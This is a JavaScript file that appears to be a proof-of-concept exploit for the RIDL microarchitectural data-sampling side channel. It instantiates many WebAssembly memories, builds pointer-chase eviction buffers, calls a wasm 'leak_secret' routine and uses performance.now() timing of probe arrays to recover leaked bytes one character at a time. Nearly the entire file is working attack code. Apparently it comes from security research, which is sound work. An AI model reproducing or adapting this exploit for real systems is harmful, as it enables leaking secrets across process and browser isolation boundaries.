const KB = (1<<10);
const MB = (1<<20);
const GB = (1<<30);

// set to true if you want to print top 10 leaked vals
const DEBUG = false;

 
// PARAMS  
const PAGE_SIZE = 4096;
const PAGE_SHIFT = 12;
const ROUNDS = 5000; // increment the rounds to get better results
const SECRET = 0x42;
const EVICTION_SIZE = 4<<10;
const PROBE_BITS = 8;
const PROBE_SHIFT = 10;
const PROBES_COUNT = (1<<PROBE_BITS);
const MEMORY_COUNT = 200;
const MEM_SIZE = 1*GB;
const MAX_PAGE_FAULTS = MEM_SIZE>>PAGE_SHIFT;
const CACHED_THRESHOLD = 0.13;// hardcoded value for rdscp-patched performance.now()
const LEAK_STR_LEN = 27

var evict_buff8, probe_buffs;

var curr_wasm = 0;
var mems = new Array(MEMORY_COUNT);
var wasmBins = new Array(MEMORY_COUNT);
var wasmBytes = null;
var wasmModule = null;


function error(str) {		
	console.log("[ERROR] - " + str);
}

function log(str) {
	console.log("[ LOG ] - " + str);
}



function probe_offset(offset, probe_buff8) {
	"almost asm"
	var t0 = 0; 
	var t1 = 0;
	var temp = 0;
	t0 = +performance.now();
	temp = probe_buff8[((offset|0)<<PROBE_SHIFT)|0];
	t1 = +performance.now() + temp;
	return +(t1 - t0);
}



function probing_time(probe_buff8, times_buff64) {
	var bit = 0;
	var temp = 0;
	var wasmBin = wasmBins[curr_wasm];
        var start = Math.random() * (256);
	for (var set = 0; set < PROBES_COUNT; set++) {
                var n = (start + set) & 0xff;
		bit = ((n * 167) + 13) & 0xff;
		times_buff64[bit|0] = probe_offset(bit, probe_buff8);
		temp += times_buff64[bit];
	}
	return temp;

}

/*
Setup 1K p-chase for the eviction. 
The p-chase is then executed in wasm before the leak
*/

function evict_init(evict_buff32, start_off, len) {

	var last_off = (start_off<<PAGE_SHIFT);
	for (var i = 0; i < len; i++) {
		var next_idx = (last_off + (1<<PROBE_SHIFT));
		evict_buff32[last_off>>2] = (next_idx);
		last_off = next_idx;
	}

}


async function ridl() {


	var results = new Array(PROBES_COUNT);
	var global_times = new Uint32Array(PROBES_COUNT).fill(0x00);
	var times_buff64 = new Float64Array(PROBES_COUNT).fill(0x00);
	var counter_buff32 = new Uint32Array(PROBES_COUNT).fill(0x00);
	for (var i = 0; i < PROBES_COUNT; i++) {
		results[i] = [i, 0];
	}

	probe_buffs = new Array(MEMORY_COUNT);
	curr_paging_off = PROBES_COUNT+1;
	var temp = 0;

	for (var i = 0; i < MEMORY_COUNT; i++) {
		mems[i] = new WebAssembly.Memory({initial:16384 , maximum:16384});
		imports = {'env': {'memory': mems[i]}};//, 'secret': SECRET}};
        wasmModule = await WebAssembly.instantiate(wasmBytes, imports);
		wasmBins[i] = wasmModule.instance.exports;
		curr_buff = mems[i].buffer;
		var curr_buff = mems[i].buffer;
		probe_buffs[i] = new Uint8Array(curr_buff, 0, PROBES_COUNT*PAGE_SIZE);
		probe_buffs[i].fill(0x00);
		var evict_buff32 = new Uint32Array(curr_buff);
		evict_init(evict_buff32, PROBES_COUNT, EVICTION_SIZE);

	}

	log('Done init!');
	log("~~~~~~ SHOW TIME ~~~~~");


	var probe_buff8 = probe_buffs[curr_wasm];
	var curr_paging_off = PROBES_COUNT+(EVICTION_SIZE>>2) + 1; 

	var start = Date.now();
	for (var cl_off = 0; cl_off < LEAK_STR_LEN; cl_off++) {

		// reset the results buff
		for (var i = 0; i < PROBES_COUNT; i++) {
			results[i] = [i, 0];
		}


		for (var r = 0; r < ROUNDS|0; r++) {

			if (curr_paging_off >= MAX_PAGE_FAULTS) {
				// dereference hoping it will be GCed
				wasmBins[curr_wasm] = null;
				probe_buffs[curr_wasm] = null;
				mems[curr_wasm] = null;

				curr_wasm += 1;
				curr_paging_off = PROBES_COUNT+(EVICTION_SIZE>>2) + 1;
				probe_buff8 = probe_buffs[curr_wasm];
			}
			
			times_buff64.fill(0x00);
			temp += wasmBins[curr_wasm].leak_secret(curr_paging_off, cl_off);
			temp += probing_time(probe_buff8, times_buff64); 
			
			for (var i = 0; i < PROBES_COUNT; i++) {
				if (times_buff64[i] < CACHED_THRESHOLD)
					results[i][1] += 1;
			}
			curr_paging_off += 1;
		
		}

		results.sort((e1,e2) => { return e2[1] - e1[1];});
		results = results.slice(0, 10);
		if (DEBUG) {
			for (var i = 0; i < results.length; i++) {
				log("[0x" + results[i][0].toString(16) + "]\t= " + results[i][1] + "\t" + String.fromCharCode(results[i][0]));	
			}
			log("")	
		} else {
			results = results.filter(value => (value[0] >= 0x20));
			log("[0x" + results[0][0].toString(16) + "]\t= " + results[0][1] + "\t" + String.fromCharCode(results[0][0]));		
		}
		
	}
	var end = Date.now();
	var tot_time = (end-start)/(4*(10**6));
	log("~~~~~~ SHOW's OVER ~~~~~");
	log("Time: " + tot_time);
	log(15/tot_time + " B/s");
	return temp;

}


async function main() {

	var wasmRead = os.file.readFile('ridl.wasm', "binary");
	wasmBytes = wasmRead;
	var results = await ridl();
	return results;

}



main();






